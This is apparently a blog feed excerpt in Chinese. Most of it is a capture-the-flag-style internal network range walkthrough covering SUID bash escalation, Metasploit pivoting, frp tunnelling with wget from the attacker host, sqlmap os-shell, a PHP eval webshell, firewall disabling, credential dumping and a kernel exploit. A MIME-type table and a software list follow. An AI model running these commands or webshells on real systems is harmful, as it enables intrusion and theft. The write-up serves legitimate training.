class="hljs-number">1025</span>, <span class="hljs-number">65535</span>)  <br><br><span class="hljs-keyword">try</span>:<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sock.bind((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port))<br>    sock.listen(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Listening on localhost:<span class="hljs-subst">&#123;port&#125;</span>&#x27;</span>)<br>    <br>    (clientsock, addr) = sock.accept() <br>    clientsock.send(<span class="hljs-string">b&#x27;Enter the secret passsword: &#x27;</span>)  <br>    <span class="hljs-keyword">if</span> clientsock.recv(<span class="hljs-number">1024</span>).strip().decode() != <span class="hljs-string">&#x27;mortals&#x27;</span>:<br>        clientsock.send(<span class="hljs-string">b&#x27;Wrong password!\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        clientsock.send(<span class="hljs-string">b&#x27;Welcome admin!\n&#x27;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            clientsock.send(<span class="hljs-string">b&#x27;\nWhat do you wanna do: \n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[1] View processes\n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[2] View free memory\n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[3] View listening sockets\n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[4] Quit\n&#x27;</span>)<br>            option = <span class="hljs-built_in">int</span>(clientsock.recv(<span class="hljs-number">1024</span>).strip())<br>            <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;ps aux&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;df&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;ss -lnt&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">4</span>:<br>                clientsock.send(<span class="hljs-string">b&#x27;Bye\n&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>    pdb.post_mortem(e.__traceback__)<br><span class="hljs-keyword">finally</span>:<br>    quit()<br></code></pre></td></tr></table></figure><p>在第一个ssh链接上执行脚本文件，另外开启一个ssh链接监听脚本开启的端口并进行错误的输入。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">SSH1:<br>sudo python3 /opt/root.py<br><br>SSH2:<br>nc localhost 26676  //这个端口是脚本开启的那个<br>mortals<br>a<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802113453010.png" class title="image-20230802113453010"><img src="/posts/64d31b65/image-20230802113626976.png" class title="image-20230802113626976"><p>然后执行以下命令：赋予 /bin/bash读写权限并执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">os.system(&#x27;chmod u+s /bin/bash&amp;&amp;bash -p&#x27;)<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802113638797.png" class title="image-20230802113638797"><p>root！斯巴拉西！👍👍👍</p><p>还有另外一种方法，这里把bin/bash复制到一个临时文件夹下，然后再给权限，执行，同样也可以提权。</p><img src="/posts/64d31b65/image-20230802114005210-1690947607065-33.png" class title="image-20230802114005210"><img src="/posts/64d31b65/image-20230802114156113-1690947717527-35.png" class title="image-20230802114156113"><p>然后再把这个root权限也上线MSF，道理和刚刚一样，我直接用之前的那个马子（当时没想太多，后来想想这端口一样冲突了呀。。。但是好像没啥印影响，后面也没管。。。）</p><img src="/posts/64d31b65/image-20230802114603109-1690947964275-37.png" class title="image-20230802114603109"><img src="/posts/64d31b65/image-20230802114613812.png" class title="image-20230802114613812"><p>这里面有个小flag</p><img src="/posts/64d31b65/image-20230802114639478-1690948001101-39.png" class title="image-20230802114639478"><h2 id="二层内网"><a class="header-anchor" href="#二层内网">¶</a>二层内网</h2><p>边界主机算是拿下了，继续进行信息收集。</p><p>用MSF建立路由，让kali可以通过边界主机访问到内网的主机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">run post/multi/manage/autoroute  <span class="hljs-comment">#添加路由</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">run autoroute -p    <span class="hljs-comment">#查看路由</span></span><br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802115057393-1690948258941-41.png" class title="image-20230802115057393"><p>报了一堆错，但是好像还是可以访问到的先不管了。</p><p>使用msf的端口扫描模块对内网网端10.0.20.0进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/portscan/tcp<br>set rhost 10.0.20.0/24<br>set ports 21,22,80,135,139,445,8080<br>set threads 30<br>run<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802133652596.png" class title="image-20230802133652596"><p>发现内网主机10.0.20.100开启80端口，在MSF上架设socks5代理服务器，并是Firefox通过代理访问该站点。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvport 1080<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802134217540.png" class title="image-20230802134217540"><p>抓个包就断了！？</p><p>抓包抓错了，然后在抓发现代理直接断了（msf的代理模块太烂啦）这里直接用frp吧。</p><p>先配置一下frp的客户端和服务端配置文件。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#frps.ini</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7100</span><br><br><br><span class="hljs-comment">#frpc.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>  --&gt;kali地址<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7100</span><br><br><span class="hljs-section">[plugin_socks]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">8971</span>    <br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure><p>服务端放在kali上运行,客户端通过上传木马的方式上传到目标主机。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>:<span class="hljs-number">9090</span>/frpc.ini<br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>:<span class="hljs-number">9090</span>/frpc<br></code></pre></td></tr></table></figure><p>给权限什么的就不多说了。</p><p>先运行kali上的服务端文件,再运行边界主机上的客户端文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c frps.ini<br><br>./frpc -c frpc.ini<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802140023245.png" class title="image-20230802140023245"><p>Frp yyds,访问嘎嘎快！！！(记得浏览器配置scoks5代理)</p><p>在右上角有<code>Admin Login</code>按钮点击可进入后台登录页面，在此可配置BP的<code>SOCKS5</code>代理进行抓包爆破。</p><img src="/posts/64d31b65/1658308045365-9b249b12-f581-48c9-b09b-dcb8150bb9d9.png" class title="img"><p>按照以下抓包思路即可抓取是内网站点的HTTP数据包</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean">#代理流程<br>Browser&lt;---&gt;BurpSuite&lt;---&gt;Socks Proxy Server&lt;---&gt;WebSite<br>#步骤设置<br><span class="hljs-number">1.</span>开启BurpSuite进入ProjectOptions选中SOCKS Proxy<br><span class="hljs-number">2.</span>勾选Override user options并且填写Use SOCKS proxy下的host与port为MSF开启的代理地址与端口<br><span class="hljs-number">3.</span>回到火狐浏览器设置BP代理为HTTP类型的<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span>与MSF的SOCKS5类型代理<br><span class="hljs-number">4.</span>先挂MSF的代理访问站点到用户登录界面要抓取的数据包，在挂BP的代理且在BP的Proxy模块开启监听<br><span class="hljs-number">5.</span>此时已经设置了浏览器的数据走BP，而BP抓到的数据走SOCKS5代理，抓取登陆请求的HTTP数据包...<br>注：此种方式也可隐藏自身IP地址...<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/3-5.jpg" class title="img"><img src="/posts/64d31b65/image-20230802140441107.png" class title="image-20230802140441107"><p>利用用户名和密码登录到后台中去</p><p>该OVAS CMS后台存在SQL注入，在此后台页面点击<code>Inquiries</code>–&gt;<code>Action</code>–&gt;<code>View</code>使用BP抓取到数据包且保存到本地文件中</p><img src="/posts/64d31b65/3-8.jpg" class title="img"><p>使用SQLMAP对其抓取的HTTP请求包进行SQL注入测试，发现存在SQL注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains4 python3 sqlmap -r insql.txt --batch<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802140803302.png" class title="image-20230802140803302"><p>老套路</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#判断是否为dba</span><br>sqlmap -r insql.txt <span class="hljs-params">--proxy=socks5</span>:<span class="hljs-string">//192.168.172.129</span><span class="hljs-function">:8971</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--is-dba</span><br><span class="hljs-comment">#获取交互式Shell</span><br>sqlmap -r insql.txt <span class="hljs-params">--proxy=socks5</span>:<span class="hljs-string">//192.168.172.129</span><span class="hljs-function">:8971</span> <span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802141013008.png" class title="image-20230802141013008"><p>system权限，写入一句话木马进行权限维持。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> ^&lt;^?php <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span>;<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;test&#x27;</span>].<span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span>);?^&gt;^ &gt; test.php<br></code></pre></td></tr></table></figure><p>访问一下</p><img src="/posts/64d31b65/image-20230802141106157.png" class title="image-20230802141106157"><p>好像是写入成功了。不确定再看看</p><p>配置一下蚁剑的代理</p><img src="/posts/64d31b65/image-20230802141157813.png" class title="image-20230802141157813"><p>一开始木马地址没搞对，怎么都连不上，我直接把马子写进index页里，然后连。</p><img src="/posts/64d31b65/image-20230802141203363.png" class title="image-20230802141203363"><img src="/posts/64d31b65/image-20230802141235669.png" class title="image-20230802141235669"><p>OK起飞！</p><img src="/posts/64d31b65/image-20230802141426031.png" class title="image-20230802141426031"><p>进去先把防火墙关了。</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall show allprofile <span class="hljs-keyword">state</span>      //查看防火墙状态<br>netsh advfirewall <span class="hljs-built_in">set</span>  allprofile <span class="hljs-keyword">state</span> off  //关闭防火墙<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802141448114.png" class title="image-20230802141448114"><p>整个正向马用蚁剑上传上去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8383 -f exe &gt; insec.exe<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> lport 8383<br><span class="hljs-built_in">set</span> rhost 10.0.20.100<br>Run<br></code></pre></td></tr></table></figure><p>我去刚上传上去马子就没了？😡</p><p>得过Defander啊😱</p><p>不会过，夏波！🏃🏃</p><p>算了，再试试，找找Dender混淆的文章</p><p>一顿操作啥用没有，</p><p>莫名其妙（手动关墙）最后终于连上了。</p><p>接着信息收集。。。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#执行命令</span><br><span class="hljs-attribute">systeminfo</span><br><span class="hljs-attribute">ipconfig</span> /<span class="hljs-literal">all</span><br><span class="hljs-attribute">load</span> kiwi<br><span class="hljs-attribute">creds_all</span>   ——&gt;   dfc8d2bfa540a0a6e2248a82322e654e Admin#<span class="hljs-number">123</span><br><span class="hljs-attribute">run</span> getgui -e<br><span class="hljs-attribute">netstat</span> -an | findstr <span class="hljs-number">3389</span>   <br><span class="hljs-attribute">tasklist</span> /svc ——&gt;   MsMpEng.exe &lt;=&gt; Windows Defender<br><br><span class="hljs-comment">#收集信息</span><br><span class="hljs-attribute">OS</span>:Wins16<br><span class="hljs-attribute">NIC1</span>：<span class="hljs-number">10.0.20.100</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">NIC2</span>：<span class="hljs-number">10.0.10.139</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">username</span>:administraotr<br><span class="hljs-attribute">password</span>:Admin#<span class="hljs-number">123</span><br><span class="hljs-attribute">RDP</span> Port:<span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802141922688.png" class title="image-20230802141922688"><img src="/posts/64d31b65/image-20230802142126819.png" class title="image-20230802142126819"><img src="/posts/64d31b65/image-20230802142146859.png" class title="image-20230802142146859"><p>也算是拿下，添加路由信息并扫描10.0.10.0网段机器，发现10.0.10.110存活。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#添加路由信息</span><br><span class="hljs-attribute">run</span> post/multi/manage/autoroute<br><span class="hljs-attribute">run</span> autoroute -p   //查看路由信息<br><span class="hljs-comment">#扫描内网存活主机</span><br><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">10.0.10.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">set</span> ports <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">6378</span>,<span class="hljs-number">113</span>,<span class="hljs-number">114</span>,<span class="hljs-number">81</span>,<span class="hljs-number">8000</span><br><span class="hljs-attribute">set</span> threads <span class="hljs-number">30</span><br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure><h2 id="三层内网"><a class="header-anchor" href="#三层内网">¶</a>三层内网</h2><p>使用以上抓取破解出的账户密码远程登录到内网Windows主机上</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#代理配置</span><br><span class="hljs-attribute">vim</span> /etc/proxychains4.conf<br><span class="hljs-attribute">socks5</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">8971</span><br><span class="hljs-comment">#桌面链接</span><br><span class="hljs-attribute">proxychains4</span> rdesktop <span class="hljs-number">10.0.20.100</span>----》失败，连接出错<br></code></pre></td></tr></table></figure><p>开3389端口</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><br>netstat -ano | findstr <span class="hljs-string">&quot;3389&quot;</span><br></code></pre></td></tr></table></figure><p>直接本地通过SocksCap64代理进行远程连接，成功连接到远程桌面</p><img src="/posts/64d31b65/4-2.jpg" class title="img"><img src="/posts/64d31b65/4-3.jpg" class title="img"><p>在下方看到<code>MobaXterm</code>打开后需要输入密码使用本机管理员密码登录成功，且存在一Linux主机为上面扫描出来的内网机器，点开后为<code>vulntarget</code>普通用户登录。</p><img src="/posts/64d31b65/4-4.jpg" class title="img"><p>接下来需要提权有两种方法：</p><p>方法一：直接通过MobaXterm查看密码，点击上方的Settings按照流程进行点击，需要输入登录用户的密码即：Admin#123</p><img src="/posts/64d31b65/4-5.jpg" class title="img"><img src="/posts/64d31b65/4-6-1690957696036-60.jpg" class title="img"><img src="/posts/64d31b65/4-7.jpg" class title="img"><p>成功获取到10.0.10.110中的用户vulntarget的密码为vuln@qwe，利用sudo进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo su<br></code></pre></td></tr></table></figure><p>方法二：根据Linux内核版本尝试提权，将提权项目下载至本地并编译好上传至<code>Wins16</code>在拖进LinuxShell中执行之后即可提权成功…获取<code>Flag</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span> -a<br><span class="hljs-attribute">Linux</span> ubuntu <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">186</span>-generic #<span class="hljs-number">216</span>-Ubuntu SMP Wed Jul <span class="hljs-number">1</span> <span class="hljs-number">05</span>:<span class="hljs-number">34</span>:<span class="hljs-number">05</span> UTC <span class="hljs-number">2020</span> x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure><p>项目地址<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">gcc exploit.c -o exploit<br>./exploit<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/4-9.jpg" class title="img"><p>结束。</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件后缀与MIME类型对照表</title>
    <link href="/posts/732bd708.html"/>
    <url>/posts/732bd708.html</url>
    
    <content type="html"><![CDATA[<p>MIME (***M***ultipurpose ***I***nternet ***M***ail ***E***xtensions) 是描述消息内容类型的因特网标准。</p><p>以下是一些文件后缀（扩展名）对应的MIME类型的一个对照表，方便iis中或其他服务器对相应的文件进行解析。</p><p>有些文件的后缀名没有默认解析就出现上传后无法访问或者下载的问题，这个时候就要设置文件后缀对应的MIME类型，设置后才能访问或者下载。</p><p>》》》文档文件类型《《《</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.ai        application/postscript<br>.eps        application/postscript<br>.exe        application/octet-stream<br>.doc        application/vnd.ms-word<br>.xls        application/vnd.ms-excel<br>.ppt        application/vnd.ms-powerpoint<br>.pps        application/vnd.ms-powerpoint<br>.pdf        application/pdf<br>.xml        application/xml<br>.odt        application/vnd.oasis.opendocument.text<br>.swf        application/x-shockwave-flash<br></code></pre></td></tr></table></figure><p>》》》压缩文件类型《《《</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.gz        application/x-gzip<br>.tgz        application/x-gzip<br>.bz        application/x-bzip2<br>.bz2        application/x-bzip2<br>.tbz        application/x-bzip2<br>.zip        application/zip<br>.rar        application/x-rar<br>.tar        application/x-tar<br><span class="hljs-number">.7</span>z        application/x<span class="hljs-number">-7</span>z-compressed<br></code></pre></td></tr></table></figure><p>》》》文字类型《《《</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.txt        text/plain<br>.php        text/x-php<br>.html        text/html<br>.htm        text/html<br>.js        text/javascript<br>.css        text/css<br>.rtf        text/rtf<br>.rtfd        text/rtfd<br>.py        text/x-python<br>.java        text/x-java-source<br>.rb        text/x-ruby<br>.sh        text/x-shellscript<br>.pl        text/x-perl<br>.sql        text/x-sql<br></code></pre></td></tr></table></figure><p>》》》图片类型《《《</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.bmp        image/x-ms-bmp<br>.jpg        image/jpeg<br>.jpeg        image/jpeg<br>.gif        image/gif<br>.png        image/png<br>.tif        image/tiff<br>.tiff        image/tiff<br>.tga        image/x-targa<br>.psd        image/vnd.adobe.photoshop<br></code></pre></td></tr></table></figure><p>》》》音频文件类型《《《</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.mp3        audio/mpeg<br>.mid        audio/midi<br>.ogg        audio/ogg<br>.mp4a        audio/mp4<br>.wav        audio/wav<br>.wma        audio/x-ms-wma<br></code></pre></td></tr></table></figure><p>》》》视频文件类型《《《</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.avi        video/x-msvideo<br>.dv        video/x-dv<br>.mp4        video/mp4<br>.mpeg        video/mpeg<br>.mpg        video/mpeg<br>.mov        video/quicktime<br>.wm        video/x-ms-wmv<br>.flv        video/x-flv<br>.mkv        video/x-matroska<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新电脑安装所需装备</title>
    <link href="/posts/bf2d52cc.html"/>
    <url>/posts/bf2d52cc.html</url>
    
    <content type="html"><![CDATA[<h1>新电脑安装所需装备</h1><p>以后可能要换电脑，为了自己不一边用一边安装，先提前列出要配置的东西，方便一次性配置。（自用）</p><h2 id="新电脑设置"><a class="header-anchor" href="#新电脑设置">¶</a>新电脑设置</h2><h3 id="更改存储位置"><a class="header-anchor" href="#更改存储位置">¶</a>更改存储位置</h3><p>win+i打开设置–&gt;系统–&gt;高级存储设置–&gt;保存新内容的地方–&gt;全部改为除了C以外的盘</p><h3 id="隐私安全性设置"><a class="header-anchor" href="#隐私安全性设置">¶</a>隐私安全性设置</h3><p>win+i–&gt;隐私和安全性–&gt;常规–&gt;四个全关</p><h2 id="预备软件（方便下载）"><a class="header-anchor" href="#预备软件（方便下载）">¶</a>预备软件（方便下载）</h2><ol><li>小小工具包（）</li><li>迅雷</li><li>百度网盘</li><li>clash（有些装备需要魔法上buff）</li><li>Bandizip（自觉好用解压工具）</li><li>火绒（下了先设置白名单防止被乱杀）</li></ol><h2 id="运行环境："><a class="header-anchor" href="#运行环境：">¶</a>运行环境：</h2><ol><li>双python、pip（conda）</li><li>双java（先安装高版本）</li><li>ruby</li><li>tdm-gcc</li><li>git</li><li>go</li><li>VMware</li><li>phpstudy（小皮）</li><li>jython</li></ol><h2 id="必备软件："><a class="header-anchor" href="#必备软件：">¶</a>必备软件：</h2><h3 id="浏览器："><a class="header-anchor" href="#浏览器：">¶</a>浏览器：</h3><p>google</p><p>Firefox</p><p>tor</p><p>edge（一般自带）</p><h3 id="代码："><a class="header-anchor" href="#代码：">¶</a>代码：</h3><p>teminal（微软商店）</p><p>VScode</p><p>IDEA</p><p>Pycharm</p><p>PhpStorm</p><p>sublime</p><h3 id="学习-办公工具"><a class="header-anchor" href="#学习-办公工具">¶</a>学习/办公工具:</h3><p>腾讯会议</p><p>Typora（找破解，别升级！）</p><p>语雀文档</p><p>便筏</p><p>Xmind</p><p>OBS（steam）</p><p>WPS</p><p>onlyoffice</p><p>office tools PLUS</p><h3 id="生活用品："><a class="header-anchor" href="#生活用品：">¶</a>生活用品：</h3><p>QQ</p><p>微信</p><p>Telegram</p><p>网易云音乐（记得下载插件）</p><p>网易有道翻译</p><p>steam</p><p>Wallpaper Engine</p><p>QQ音乐</p><p>百度网盘</p><p>阿里云盘</p><p>夸克网盘</p><p>alist（统一管理网盘）</p><p>RaiDrive（像磁盘一样在本地管理网盘）（弹小广告，岂可修(•́へ•́╬)）</p><p>potplayer(嘎嘎板正的视频播放器)</p><p>ndm（Neat Download Manager）</p><h2 id="因吹斯汀的小玩意"><a class="header-anchor" href="#因吹斯汀的小玩意">¶</a>因吹斯汀的小玩意</h2><p>start11（win11美化，$）</p><p>草特码（吾爱破解下载，free）</p><p>everything（搜索找不到？不存在的）</p><p>OSSQ（版本转换）</p><p>格式工厂</p><p>Motrix(github上的下载工具，迅雷会员拜拜)</p><p>scrcpy-win64-v2.0(手机投屏神器)</p><h2 id="hacker工具（下载或更新）"><a class="header-anchor" href="#hacker工具（下载或更新）">¶</a>hacker工具（下载或更新）</h2><p>自制工具包</p><p>AWVS</p><p>Nessus</p><p>CS（不是CF）</p><p>Goby</p><p>Yakit</p><p>Xray</p><p>sqlmap</p><p>BP（记得下插件）</p><p>哥蚁冰菜</p><p>Finalshell</p><p>向日葵</p><p>Mobaterm</p><p>Windows11 Penetration Suite Toolkit（github）</p><p>V2ray</p><p>RIPS</p><p>Seay</p><p>VCG</p><p>Wallet</p><p>NSSM(你的进程由我来守护)</p><p>++++</p><p>暂时想到的这么多，后续慢慢补充……ψ(*｀ー´)ψ</p>]]></content>
    
    
    <categories>
      
      <category>软件配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Web安全学习总结</title>
    <link href="/posts/d62edc36.html"/>
    <url>/posts/d62edc36.html</url>
    
